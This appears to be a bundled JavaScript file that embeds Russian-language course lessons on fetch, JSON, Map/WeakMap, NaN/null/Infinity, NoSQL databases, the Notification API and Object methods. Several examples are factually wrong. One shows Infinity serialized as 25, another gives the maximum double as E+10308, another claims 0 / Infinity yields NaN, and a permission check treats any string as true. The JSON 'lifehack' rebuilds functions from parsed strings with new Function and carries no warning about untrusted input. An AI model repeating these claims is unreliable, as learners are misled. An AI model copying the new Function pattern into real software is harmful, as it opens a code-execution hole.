https://jsonplaceholder.typicode.com/comments?postId=1\n~~~\n\n![](https://lh6.googleusercontent.com/RRQtfUSawytMqnSDIF4k8wpz1oDzkM8-RxWqBR3XN5PR18HS3jOfGfAyNVYe587xnJL0NoPfy7V1MbovDbOpPuJ0nFj0O-LZinvj2dmdBb1yLKFtRwMcKf7tXimuD0nEB0ZECxD7oPr7liU)\n\n_____________________________________________\n\n### ![ico-25 cap] fetch\n\nПолучим все комментарии к первому посту прямо в консоли браузера, воспользовавшись методом ~fetch~\n\n~~~js\nfetch('https://jsonplaceholder.typicode.com/comments?postId=1')\n  .then(response => response.json())\n  .then(json => console.log(json))\n~~~\n\n![](https://lh6.googleusercontent.com/tQof5aM48ME-v6g1l-4gkfE2v2WYqinFGYyarEsCdKNvAxfQLjY02h9VffWTvVqk1QlkMxpy14ZNhbCTnVxTzIdMb-5-CYM4zgEVzXQUdodp0UUFx5SMozubZ-1kmTRdly-mS03cSBVGDQ8)\n"},83896:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] JSON\n\nФормат хранения объектов JS  в виде текстовой строки удобен с точки зрения обмена данными с сервером и хранения данных сложной структры\n\nОн является более компактной альтернативой формату **XML** (e<b>X</b>tensible ** M**arkup ** L**anguage)\n\n**~JSON~** - это встроенный нативный объект (![ico-20 warn] не конструктор)\n\nИмеет всего два метода:\n\n![ico-20 green-ok] **JSON.stringify()**\n![ico-20 green-ok] **JSON.parse()**\n\n~~~~console\n▼ JSON\n    ► parse: ƒ parse()\n    ► stringify: ƒ stringify()\n      Symbol(Symbol.toStringTag): "JSON"\n    ▼ __proto__:\n        ► constructor: ƒ Object()\n        ► hasOwnProperty: ƒ hasOwnProperty()\n        ► isPrototypeOf: ƒ isPrototypeOf()\n        ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n        ► toLocaleString: ƒ toLocaleString()\n        ► toString: ƒ toString()\n        ► valueOf: ƒ valueOf()\n        ► __defineGetter__: ƒ __defineGetter__()\n        ► __defineSetter__: ƒ __defineSetter__()\n        ► __lookupGetter__: ƒ __lookupGetter__()\n        ► __lookupSetter__: ƒ __lookupSetter__()\n        ► get __proto__: ƒ __proto__()\n        ► set __proto__: ƒ __proto__()\n~~~~\n\n_____________________\n\n## ![ico-25 icon] JSON.stringify()\n\nЕдинственный обязательный аргумент метода - ссылка на объект или массив, причем глубина структуры данных не ограничена\nДва дополнительных формальных параметра являются опциональными.\nВозвращаемое значение -  JSON-строка\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj)\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green","size":200,"position":[250,250]}\'\n~~~\n\n![ico-25 cap] ** 2**\n\nВторой (опциональный) формальный параметр может быть использован, например, следующим образом:\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj, [\'name\', \'type\', \'color\'])\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green"}\'\n~~~\n\n![ico-25 cap] ** 3**\n\nТретий (опциональный) формальный параметр нужен для форматирования результата:\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nconsole.log(JSON.stringify(obj, null, 2))\n~~~\n\n~~~console\n{\n  "name": "sample",\n  "type": "figure",\n  "color": "green",\n  "size": 200,\n  "position": [\n    250,\n    250\n  ]\n}\n~~~\n\n### Ограничения\n\nДелов в том, что сериализация объектов не всегда возможна.\nЕсть так называемые несериализуемые объекты, содержащие циклические ссылки.\n\nНапример, при попытке сериализовать объект **window** мы получим _TypeError_:\n\n![ico-25 cap] ** 4**\n\n~~~js\nconsole.log(JSON.stringify(window, null, 2))\n~~~\n\n••![ico-20 error] Uncaught TypeError: Converting circular structure to JSON••\n\nПопробуем сериализовать объект, содержащий следующие свойства:\n\n![ico-25 cap] ** 5**\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: Infinity,\n  hobby: \'football\',\n  [Symbol.for(\'user-pay\')]: 45,\n  job: undefined,\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football"\n}\n~~~\n\nКак видно из примера, **Infinity**, **undefined** и **Symbol**, а так же методы объекта отбрасываются при сериализации.\n\n_____________________\n\n## ![ico-25 icon] JSON.parse()\n\nЕдинственный обязательный аргумент метода - JSON-строка\nВозвращаемое значение - структура данных JS ( массив или объект )\n\n![ico-20 warn] В строке  JSON  все строчные значения ( включая имена свойств )  заключаются в **двойные** кавычки\n![ico-20 warn] Числовые и логические значения, массивы и объекты в кавычки не заключаются\n\n![ico-25 cap] ** 6**\n\n~~~js\nvar x = `{\n  "name": "sample",\n  "type": "figure",\n  "attrs": {\n    "color": "green",\n    "size": 200,\n    "position": [250, 250]\n  }\n}`\n\nJSON.parse(x)\n~~~\n\n~~~console\n▼ {name: "sample", type: "figure", attrs: {…}}\n  ▼ attrs:\n        color: "green"\n      ► position: (2) [250, 250]\n        size: 200\n      ► __proto__: Object\n    name: "sample"\n    type: "figure"\n  ► __proto__: Object\n~~~\n\n___________________\n\n## ![ico-25 icon] Глубокое копирование\n\nИзвестно, что массивы и объекты передаются по ссылке\n\nЕсли объект имеет плоскую структуру, то получить точную копию этого объекта можно с помощью метода **~Object.assign()~**\n\nОднако если свойства объекта являются объектами или массивами, то **~Object.assign()~** скопирует ссылки на эти вложенные объекты\n\nЕсли же выполнить сначала **~JSON.stringify()~**, а затем **~JSON.parse()~**, то в результате мы получим точную копию объекта, а не ссылку\n\n![ico-25 cap] ** 7**\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\nvar sample = JSON.parse(JSON.stringify(obj))\n~~~\n\nВ переменной **sample** теперь находится точная копия объекта **obj**, включая значения элементов массива **position**, а не ссылка на него\n\nСравним результаты  **~Object.assign()~** и  **~JSON.stringify()~** → **~JSON.parse ()~**\n\n~~~js\nvar test = Object.assign({}, obj)\n~~~\n\nЛогическое выражение\n\n~~~js\ntest.position === obj.position\n~~~\nвозвращает ~true~, поскольку значение свойства  **test.position** является ссылкой на объект **obj.position**\n\nА вот логическое выражение\n\n~~~js\nsample.position === obj.position\n~~~\n\nвернет  ~false~, потому что **sample.position** является другим объектом, ссылка на который не совпадает со ссылкой на объект **obj.position**\n\n------------------------------------\n\n## ![ico-25 icon] Лайфхак\n\nПоставим задачу сериализации объекта, включая его методы.\n\n![ico-25 cap] ** 8**\n\nДля этого, прежде всего, добавим конструктору Function в prototype метод **toJSON**:\n\n~~~js\nFunction.prototype.toJSON = function () {\n  return this.toString()\n}\n~~~\n\nТеперь сериализация объекта пройдет нормально, но метод будет включен в json-строку как текстовая строка:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football",\n  "getName": "getName () {\\n    console.log(this.name)\\n  }"\n}\n~~~\n\nЗапишем объявление метода несколько иначе:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName: function getName () {\n    console.log(this.name)\n  }\n}\n~~~\n\nи добавим метод **parseFuncs** объекту **JSON**:\n\n~~~js\nJSON.parseFuncs = function (obj) {\n  const result = this.parse(obj)\n  Object.keys(result)\n    .filter(key => typeof result[key] === \'string\' && !result[key].indexOf(\'function\'))\n    .forEach(key => Object.assign(result, { [key]: new Function(result[key]) }))\n\n  return result\n}\n~~~\n\nТеперь мы можем смело сериализовать объект _user_ и затем парсить результат методом **parseFuncs**:\n\n~~~js\nconst piter = JSON.parseFuncs(JSON.stringify(user))\n\nconsole.log(piter)\n~~~\n\n~~~console\n{name: \'Jack\', age: 25, hobby: \'football\', getName: ƒ}\n~~~\n'},76014:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Map\n\n**ES6**\n\nДля начала вроде ничего нового,\nколлекция пар ключ-значение...\n\nОднако ключ, который в обычном объекте должен быть либо числом, либо литералом,\nв объекте **Map** может быть чем угодно!\n\n**Конструктор**\n\n\n## WeakMap\n\nВ экземплярах этого класса ключи могут быть только объектами\nПопытка использования строк, чисел, булевых значений в качестве ключей приводит к генерации исключения:\n\n~~~js\nconst dog = new WeakMap()\n\ndog.set('remember', 'remember')\n~~~\n\n••![ico-20 error] TypeError: Invalid value used as weak map key••\n"},72404:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] NaN / null / Infinity\n\n\n## ![ico-25 icon] Значение NaN\n\n**Тип данных ~number~**\n\nСокращение от **Not a Number** ( результат операции не является числом )\n\nМожно получить в результате приведения типов, например:\n\n~~~js\n5 / \"a\"  --\x3e NaN\n\"b\" * 3  --\x3e NaN\n~~~\n\n~NaN~ является свойством глобального объекта ( ~window~ )\n\n~NaN~ также является свойством встроенного объекта ~Number~\n\n![ico-20 warn] ~NaN~ не равен ничему, даже самому себе\n\n~~~js\nNaN === NaN            // false\nNaN == NaN             // false\nNaN >= NaN             // false\nNaN <= NaN             // false\n~~~\n\nДля определения, является ли значением выражения ~NaN~,\nможно использовать методы  ~isNaN()~  и  ~Number.isNaN()~\n\nИх действие не идентично\n\n~~~js\nisNaN('привет')               //  true\nNumber.isNaN('привет')        //  false\nNumber.isNaN('привет' / 10)   //  true\n~~~\n\n^^~isNaN()~  возвращает ~true~, если после приведения типа аргумента к числу результат будет  ~NaN~^^\n\n^^~Number.isNaN()~  возвращает ~true~, если аргумент имеет значение  ~NaN~ (приведения типа не происходит)^^\n\n_____________________________________________________________\n\n## ![ico-25 icon] Значение null\n\n**Тип данных ~object~**\n\nСпециальное значение ~null~ означает \"ничего\"\n\n![ico-20 warn] ~null~ может равняться только ~null~ или ( при нестрогом сравнении ) ~undefined~\n\n~~~js      \nnull == null              // true\nnull === null             // true\nnull == undefined         // true\nnull === undefined        // false\nnull == 0                 // false\nnull == NaN               // false\nnull == false             // false\nnull == ''                // false\nnull == []                // false\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] Значение Infinity\n\n**Тип данных ~number~**\n\nЗначение, превышающее максимально возможное число с плавающей  запятой\n\nМаксимально возможное число с плавающей  запятой:\n\n~1.7976931348623157E+10308~\n\nМожет быть отрицательным (~-Infinity~)\n\n~Infinity~ может быть результатом деления на ноль отличного от нуля числа\n\n~~~js\n1 / 0            //  Infinity\n~~~\n\nОднако:\n\n~~~js\n0 / Infinity  // NaN\n\nInfinity / Infinity  // NaN\nInfinity - Infinity  // NaN\n\nInfinity * Infinity  // Infinity\nInfinity + Infinity  // Infinity\n~~~\n\n______________________________________________________________\n\n[![ico-20 link] ^^w3schools^^](https://www.w3schools.com/jsref/jsref_infinity.asp)\n"},43833:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Базы данных NoSQL\n_________________________________________________\n\n(in process... not ready yet)\n\n_____________________________________\n\n## ![ico-25 icon] Модели данных\n\nЧто определяет выбор модели баз данных ?\n\n![ico-20 green-ok] Скорость доступа к данным\n![ico-20 green-ok] Масштабируемость\n\nРеляционные базы данных типа MySQL имеют табличную модель данных,\nкогда все данные размещены во взаимосвязанных (relation) таблицах\n\nГоризонтальная масштабируемость здесь становится проблемой...\n\n^^**SQL** (Structured Query Language) — универсальный язык запросов^^\n^^(используется всеми реляционными системами)^^\n^^Язык SQL универсален для всех реляционных хранилищ^^\n^^(в случае смены СУБД не придётся переписывать весь код)^^\n\nНереляционные базы данных (**NoSQL**) предоставляют альтернативные варианты моделей баз данных\nЭто распределённые системы\nNoSQL-решения направлены на обеспечение горизонтальной масштабируемости баз данных\n\nInstagram и Facebook используют NoSQL\n\nВ отличие от реляционных баз данных, в NoSQL структура данных не является жестко регламентированной\n^^в отдельной строке или документе можно добавить произвольное поле без предварительного декларативного изменения структуры БД^^\nПри необходимости внесения изменений в модель данных это можно сделать на уровне приложения\n\nРеляционная модель хранит бизнес-логику приложения в различных физических таблицах с целью нормализации данных\nNoSQL-хранилища оперируют с этими сущностями как с целостными объектами\n\nОднако следует помнить о специфике асинхронного доступа к данным в NoSQL:\nтрудно обеспечить согласованность данных, когда операции чтения и записи являются асинхронными,\nи к моменту записи данных в БД предыдущие значения могли быть изменены...\n\n### ![ico-20 icon] Key / value\n\nОдной из самых простых нетривиальных моделей данных является модель «ключ-значение»\nв этой модели данных используется ассоциативный массив ("карта", "словарь")\nКлючи должны иметь уникальные значения, т.е. не могут дублироваться\n\n### ![ico-20 icon] Document store\n\nДокументарнные базы данных\n\nЦентральным понятием является понятие «документ»\nДокументы содержат данные в определенном формате\nнапример, в формате XML или JSON, или в двоичном формате (BSON)\nКаждый документ адресуются в базе данных уникальным ключом, т.е. самый простой способ получить документ - по ключу\nОднако язык запросов документарных баз данных обеспечивает также возможность извлекать документы из базы данных по их содержимому\n\nВозможны различные способы организации документов:\n\n• Коллекции\n• Теги\n• Невидимые метаданные\n• Иерархии каталогов\n\n^^Если провести аналогию с реляционными базами данных, коллекции подобны таблицам, а документы - записям^^\n^^Однако в таблице каждая запись имеет одинаковую последовательность полей, а различные документы в коллекции могут иметь разные поля^^\n\n### ![ico-20 icon] Graph\n\nЭта модель представляет органзацию данных как элементов, связанных между собой конечным числом отношений\nТакие связи могут быть изображены графом, узлами ( вершинами ) которого являются элементы данных\nТакая модель подходит для социальных связей, общественного транспорта, дорожных карт, сетевых топологий и т.д.\n\n______________________________________\n\nСуществует три основных метода обработки запросов к реляционным базам данных NoSQL\n\n### ![ico-20 icon] Множественные запросы\n\n^^Не всегда возможно получить все данные одним запросом^^\n^^В этом случае для получения требуемых данных делают несколько запросов^^\n\n### ![ico-20 icon] Кэширование, репликация и денормализация\n\n^^Кэш – это высокоскоростной уровень хранения набора данных временного характера^^\n^^Основное назначение – ускорение процесса извлечения данных^^\n^^Доступ к данным в кэш осуществляется значительно быстрее, чем к основному месту их хранения^^\n^^С помощью кэширования становится возможным эффективное повторное использование ранее полученных или вычисленных данных^^\n\nВ процессе роста проекта возникает проблема масштабирования баз данных\nОсновные стратегии масштабирования — репликация и шардинг\n\n**Репликация**\n\nдублироване баз данных\n(предполагает использование двух или более серверов для хранения одной и той же базы данных)\n\n_Redis_ представляет собой классическую **master-slave** архитектуру репликации данных\n\n**Master** — основной сервер, где хранятся все данные, и только здесь происходят все изменения в данных\n( добавление, обновление, удаление данных )\n**Slave** — вспомогательный сервер для считывания данных (их может быть несколько),\nна который периодически копируются данные с основного сервера\n\nОперации чтения данных выполняются гораздо чаще, чем операции изменения данных,\nпричем операции внесения изменений в базу данных являются более сложными и затратными\nЗа счет репликации основной сервер освобождается от рутинных операций считывания данных\n\n**peer-to-peer**\n\nальтернатива _master-slave_\n\nВсе серверы имеют равные права обслуживать запросы на чтение и запись данных\nИнформация об обновлении данных передаётся от сервера к серверу по кругу\n\n**sharding**\n\nразделение базы данных на отдельные части так, чтобы каждую из них можно было вынести на отдельный сервер\n\n**денормализация**\n\nРеляционная модель предусматривает обязательную нормализацию данных\nРеляционная модель предусматривает хранение данных в виде таблиц и установление связей ( _relations_ ) между таблицами\nПри этом возникает проблема избыточности, т.е. дублирования фрагментов данных\nНормализация означает приведение структуры таблиц и связей между ними к **нормальной** форме, устраняющей избыточность\n\n________________________________________\n\n**Нормальные формы**\n\n@@@@\n\n[%%%^^Первая нормальная форма^^%%%](https://en.wikipedia.org/wiki/First_normal_form)\n[%%%^^Вторая нормальная форма^^%%%](https://en.wikipedia.org/wiki/Second_normal_form)\n[%%%^^Третья нормальная форма^^%%%](https://en.wikipedia.org/wiki/Third_normal_form)\n[%%%^^Нормальная форма Бойса — Кодда^^%%%](https://en.wikipedia.org/wiki/Boyce%E2%80%93Codd_normal_form)\n[%%%^^Четвёртая нормальная форма^^%%%](https://en.wikipedia.org/wiki/Fourth_normal_form)\n[%%%^^Пятая нормальная форма^^%%%](https://en.wikipedia.org/wiki/Fifth_normal_form)\n[%%%^^Шестая нормальная форма^^%%%](https://en.wikipedia.org/wiki/Six_normal_form)\n\n@@@@\n\n_____________________________________\n\nИтак, цель нормализации - устранение избыточности и уменьшение потенциальной противоречивости информации в базе данных\nУстранение избыточности производится, как правило, за счёт **декомпозиции** отношений таким образом, чтобы в каждом отношении хранились только первичные факты ( то есть факты, не выводимые из других хранимых фактов )\n\n^^Например, для устранения избыточности можно создать дополнительные таблицы-справочники^^\n\nДенормализация - обратный процесс, предполагающий сознательное допущение избыточности с целью повышения производительности\n\n^^Например, каждый комментарий в блоге может включать не только _id_ автора коммента, также и его имя,^^\n^^что избавляет от необходимости повторного обращения к базе данных для получения имени по идентификатору^^\n\nДенормализация увеличивает риск нарушения целостности данных при операциях модификации\n\n^^При изменении имени пользователя в предыдущем примере нужно будет внести изменения во все комментарии этого пользователя^^\n^^Таким образом, этот подход работает лучше, когда чтения встречаются гораздо чаще, чем записи^^\n\n### ![ico-20 icon]  Вложенные данные\n\n^^С документарными базами данных, такими как **MongoDB**, обычно помещают больше данных в меньшее количество коллекций^^\n^^Например, в SPA для ведения блогов можно сохранять комментарии в документе блога, чтобы упрощает доступ к ним^^\n^^Таким образом, каждый документ содержит все необходимые данные, связанные с ним^^\n\n__________________________________________________\n\n## ![ico-25 icon] Принципы ACID\n\nAtomicity / Consistency / Isolation / Durability\n\nСоблюдение всех этих принципов одновременно недостижимо в распределённых системах баз данных NoSQL\n( "теорема" Брюера, или CAP )\nАльтернативой является **BASE** ( Basically Available, Soft-state, Eventually consistent )\nбазовая доступность, неустойчивое состояние, согласованность в конечном счёте\n\n### ![ico-25 green-ok] Atomicity\n\n**Атомарность**\n\nАтомарность гарантирует, что никакая транзакция не будет выполнена частично\n\nТранзакция состоит, как правило, из ряда последовательных операций\n^^например, банковский перевод средств означает списание нужной суммы с одного счета и зачисление этой суммы на другой счет^^\nВсе операции, из которых состоит транзакция, должны быть завершены, либо ( в случае невозможности завершения одной из операций транзакции ),\nпроисходит «откат» (rollback) транзакции, т.е. результаты всех уже завершенных операций будут отменены\n^^В многопоточном процессе один из потоков может изменить данные между фазами чтения и записи другого потока^^\n\n### ![ico-25 green-ok] Consistency\n\n**Согласованность**\n\nEOT (End Of Transaction) - завершение транзакции не должно нарушать согласованность данных\n\nв банковской системе может существовать требование равенства суммы, списываемой с одного счёта, сумме, зачисляемой на другой\nЭто бизнес-правило и оно не может быть гарантировано только проверками целостности, его должны соблюсти программисты при написании кода транзакций. Если какая-либо транзакция произведёт списание, но не произведёт зачисления, то система останется в некорректном состоянии и свойство согласованности будет нарушено.\n\nНаконец, ещё одно замечание касается того, что в ходе выполнения транзакции согласованность не требуется. В нашем примере, списание и зачисление будут, скорее всего, двумя разными подоперациями и между их выполнением внутри транзакции будет видно несогласованное состояние системы. Однако не нужно забывать, что при выполнении требования изоляции никаким другим транзакциям эта несогласованность не будет видна. А атомарность гарантирует, что транзакция либо будет полностью завершена, либо ни одна из операций транзакции не будет выполнена. Тем самым эта промежуточная несогласованность является скрытой.\n\n### ![ico-25 green-ok] Isolation\n\n**Изолированность**\n\nВо время выполнения транзакции параллельные транзакции не должны оказывать влияния на её результат\n\n### ![ico-25 green-ok] Durability\n\n**Долговечность** (надежность)\n\nНадежность подразумевает способность восстанавливаться до последнего сохраненного состояния\nпосле непредвиденного сбоя в системе или перебоя в подаче питания\n\n_________________________________________________\n'},99177:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Notification API\n\nAPI вывода уведомлений на рабочий стол юзера\n\n![ico-20 warn] Notification API работает только с приложениями, работающими на протоколе **https**\n\nКонструктор **Notification**\n\n~~~console\n▼ ƒ Notification()\n    maxActions: (...)\n    permission: (...)\n  ► requestPermission: ƒ ()\n    arguments: null\n    caller: null\n    length: 1\n    name: \"Notification\"\n  ► prototype: Notification {…}\n  ► get maxActions: ƒ maxActions()\n  ► get permission: ƒ permission()\n  ► __proto__: ƒ EventTarget()\n~~~\n\n___________________________________________\n\n## ![ico-25 icon] permission\n\nЮзер может запретить отображение уведомлений на рабочем столе\nПрежде, чем пытаться вывести уведомление юзеру, стоит проверить, разрешает ли пользователь отображать уведомления\nт.е. посмотреть значение свойства **permission** ^^(read-only)^^\n\n**permission** может принимать значения:\n\n![ico-20 green-ok] **denied**  - уведомления запрещены\n![ico-20 green-ok] **granted** - уведомления разрешены\n![ico-20 green-ok] **default** - значение не установлено, по умолчанию будет **denied**\n\nЕсли уведомления от приложения отключены, можно запросить разрешение пользователя на показ уведомлений\nДля этого Notification API предоставляет метод **requestPermission**\n^^(см. Конструктор **Notification**)^^:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nNotification.requestPermission(permission => alert(`Вы ${permission ? 'разрешили' : 'запретили'} показывать уведомления приложению ${location.host}`))\n~~~\n\n[:::Live Demo:::](https://garevna.github.io/js-samples/#44)\n\nПосле того, как разрешение получено, свойству **permission** будет установлено значение **granted**\n\n^^^[Промисифицированная версия]\n\n^^![ico-20 warn] В последней спецификации предложена новая промисифицированная форма метода **requestPermission**^^\n\n~~~js\nNotification.requestPermission()\n  .then(permission => ...)\n~~~\n\n^^однако на момент написания этого материала браузеры поддерживают старую (непромисифицированную) версию^^\n\n^^^\n____________________________\n\n## ![ico-25 icon] Экземпляр Notification\n\nС помошью конструктора **Notification** создаем новый экземпляр:\n\n~~~js\nconst notes = new Notification(title, options)\n~~~\n\nкоторый наследует кучу свойств и методов от своего конструктора\n\n**Notification.prototype**\n\n~~~~console\n▼ Notification()\n    actions: (...)\n    badge: (...)\n    body: (...)\n  ► close: ƒ close()\n    data: (...)\n    dir: (...)\n    icon: (...)\n    image: (...)\n    lang: (...)\n    onclick: (...)\n    onclose: (...)\n    onerror: (...)\n    onshow: (...)\n    renotify: (...)\n    requireInteraction: (...)\n    silent: (...)\n    tag: (...)\n    timestamp: (...)\n    title: (...)\n    vibrate: (...)\n  ► constructor: ƒ Notification()\n    Symbol(Symbol.toStringTag): \"Notification\"\n  ► get actions: ƒ actions()\n  ► get badge: ƒ badge()\n  ► get body: ƒ body()\n  ► get data: ƒ data()\n  ► get dir: ƒ dir()\n  ► get icon: ƒ icon()\n  ► get image: ƒ image()\n  ► get lang: ƒ lang()\n  ► get onclick: ƒ onclick()\n  ► set onclick: ƒ onclick()\n  ► get onclose: ƒ onclose()\n  ► set onclose: ƒ onclose()\n  ► get onerror: ƒ onerror()\n  ► set onerror: ƒ onerror()\n  ► get onshow: ƒ onshow()\n  ► set onshow: ƒ onshow()\n  ► get renotify: ƒ renotify()\n  ► get requireInteraction: ƒ requireInteraction()\n  ► get silent: ƒ silent()\n  ► get tag: ƒ tag()\n  ► get timestamp: ƒ timestamp()\n  ► get title: ƒ title()\n  ► get vibrate: ƒ vibrate()\n  ► __proto__: ƒ EventTarget()\n~~~~\n\nРазберемся с этой кучей\n\nПри создании экземпляра уведомления конструктору передается:\n• заголовок уведомления\n• объект опций\n\nЗаголовок уведомления будет храниться в свойстве **title** ^^(read-only)^^ экземпляра уведомления\n\nВсе переданные вторым аргументом опции станут значениями свойств экземпляра:\n\n![ico-20 green-ok] body (read-only) - текст уведомления\n![ico-20 question] icon (read-only) - ссылка на файл изображения, которое будет иконкой уведомления\n^^корректно отображается только в Mozilla, не отображается в Chrome и Opera^^\n![ico-20 green-ok] badge (read-only)\nссылка на маленькое монохромное изображение, отображаемое вместо уведомления на девайсах с маленьким экраном\n^^![ico-20 warn] В настоящее время бейдж используется только в Chrome для Android^^\n^^В других браузерах вы увидите иконку браузера^^\n![ico-20 question] image (read-only) - ссылка на файл изображения, которое, по идее, дожно быть отражено в уведомлении\n^^Если вам удастся добиться того, чтобы изображение отображалось в уведомлении, поделитесь опытом^^\n^^Мне не удалось заставить ни один из браузеров отобразить картинку в уведомлении^^\n![ico-20 green-ok] **requireInteraction** (read-only) - по дефолту ~false~\nОбычно уведомление закрывается автоматически через некоторое время\nЕсли вы хотите использовать кнопку \"Закрыть\" в уведомлении, то значение этой опции нужно установить ~true~\n![ico-20 green-ok] silent (read-only) - беззвучный режим\nпо дефолту ~false~\n\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nNotification\n  .requestPermission(permission => showNotification({\n    icon: 'https://garevna.github.io/js-course/images/my-photo.png',\n    image: 'https://cn.opendesktop.org/img/b/2/d/5/cfd19f550736133723633e53ba0b05def2e4.jpg',\n    message: 'Hello, students! Welcome to JS!',\n    title: 'garevna'\n}) )\n\nfunction showNotification (data) {\n  new Notification(data.title, {\n    icon: data.icon,\n    image: data.image,\n    body: data.message,\n    requireInteraction: true,\n    silent: true\n  })\n}\n~~~\n\n[:::Live Demo:::](https://garevna.github.io/js-samples/#45)\n______________________________________________________________\n\n## ![ico-25 icon] Notification from Worker\n\n![ico-20 warn] в **worker**-е недоступен метод **requestPermission** конструктора **Notification**\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst messageWorker = new Worker('./js/notification-worker.js')\n\nmessageWorker\n  .postMessage({\n    icon: 'https://garevna.github.io/js-course/ico/bash-20.png',\n    image: 'https://garevna.github.io/js-course/images/lessons/smoke-monkey.gif',\n    message: 'Hello, students! Do you like JS ?',\n    title: 'garevna'\n})\n\nconst addElem = tag => document.body\n  .appendChild(document.createElement(tag))\n\nconst addImage = url => addElem('img').src = url\n\nmessageWorker.onmessage = function (event) {\n  if (event.data.messageType === 'images') {\n    addImage(event.data.image)\n    addImage(event.data.icon)\n  } else addElem('p').innerText = event.data.text\n\n  messageWorker.terminate()\n}\n~~~\n\n◘◘![ico-20 cap] worker.js◘◘\n\n~~~js\nonmessage = function (event) {\n  showNotification(event.data)\n}\n\nfunction showNotification (data) {\n  const notification = new Notification(data.title, {\n    icon: data.icon,\n    image: data.image,\n    body: data.message,\n    requireInteraction: true,\n    silent: true\n  })\n\n  notification.onshow = function (event) {\n    postMessage({\n      messageType: 'images',\n      image: notification.image,\n      icon: notification.icon\n    })\n  }\n\n  notification.onclose = function (event) {\n    postMessage ({\n      messageType: 'text',\n      text: 'I\\'m worker. Notification has been closed'\n    })\n  }\n}\n~~~\n\n{{{Notification-with-worker-1.js}}}\n\n[:::Live Demo:::](https://garevna.github.io/js-samples/#46)\n"},30791:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Статические методы конструктора Object\n\n__________________________________\n\n## ![ico-25 icon] Object.assign()\n\nМетод копирует значения всех собственных перечислимых свойств\nиз одного или более исходных объектов  **~sources~**  в целевой объект **~target~**\n\nВозвращает целевой объект **~target~**\n\n~~~js\nObject.assign(target, ...sources)\n~~~\n\n![ico-20 warn] Копируются только **_собственные перечислимые_** свойства\n![ico-20 warn] ~Object.assign~ осуществляет неглубокое копирование\n^^Если свойства исходного объекта являются массивами или объектами, то в целевой объект будут помещены ссылки на соответствующие свойства исходного объекта^^\n\n_________________________________________________\n\n◘◘![ico-25 cap] **Пример 1**◘◘\n\n~~~js\nvar newObject = Object.assign({}, { name: 'Егор', age: 25 }, { write: true, read: true })\n~~~\n\n◘◘**^^newObject^^**◘◘\n\n~~~console\n{\n  name: \"Егор\",\n  age: 25,\n  write: true,\n  read: true\n}\n~~~\n\n_________________________________\n\n\n◘◘![ico-25 cap] **Пример 2**◘◘\n\n~~~js\n\n// Создадим объект source,\n// свойство position которого будет массивом,\n// а свойство attrs - объектом:\n\nvar source = {\n  name: 'sample',\n  attrs: {\n    type: 'figure',\n    color: 'green',\n    size: 200\n  },\n  position: [250, 250]\n}\n\n// Создадим копию target объекта source с помощью метода Object.assign:\n\nvar target = Object.assign({}, source)\n\n// Покажем, что:\n\n// свойство target.attrs содержит ссылку на объект source.attrs,\n// а свойство target.position содержит ссылку на массив source.position\n\n// Для этого изменим значение элемента массива target.position:\n\ntarget.position[0] = 100\n\n// и значение свойства target.attrs.color:\n\ntarget.attrs.color = '#fa0'\n~~~\n\nпоскольку  **~target._position_~** - это всего лишь ссылка на массив **~source._position_~**,\nа  **~target._attrs_~** - ссылка на объект **~source._attrs_~**,\nсоответствующее значение массива **~source._position_~**\nи значение свойства **~_attrs_._color_~** объекта **~source~** изменились:\n\n![](illustrations/Object-assign-01.png)\n\n_______________________\n\n## ![ico-25 icon] Object.create()\n\n^^Этот метод использовался для доступа к прототипу объекта до того, как в спецификации ES6 (2015) появилось свойство **~&#95;&#95;proto&#95;&#95;~**^^\n\nСоздает экземпляр объекта на основе прототипа\n\n• Методу нужно передать в качестве первого аргумента ссылку на прототип, который будет использован при создании экземпляра\n• Вторым (опциональным) аргументом может быть объект-дескриптор свойств создаваемого экземпляра\n\n◘◘![ico-25 cap] **Пример 3**◘◘\n\n~~~js\nvar figure = {\n  className: 'Figure'\n}\nvar circle = Object.create(figure)\n~~~\n\nЕсли передать ~null~  в качестве аргумента, будет создан объект без прототипа:\n\n~~~js\nvar emptyObject = Object.create(null)\n~~~\n\n________________________\n\n![ico-25 warn] Метод ~Object.create()~ позволяет задавать дескрипторы свойств объекта\n^^( как это делает метод ~Object.defineProperty()~, который добавляет свойство в объект )^^\n\n^^^[Пример 4]\n\n~~~js\nfunction Figure (figType) {\n  this.type = figType\n  console.log('Instance of Figure created')\n}\nFigure.prototype.className = 'Figure'\n\nvar circle = Object.create(new Figure('circle'), {\n  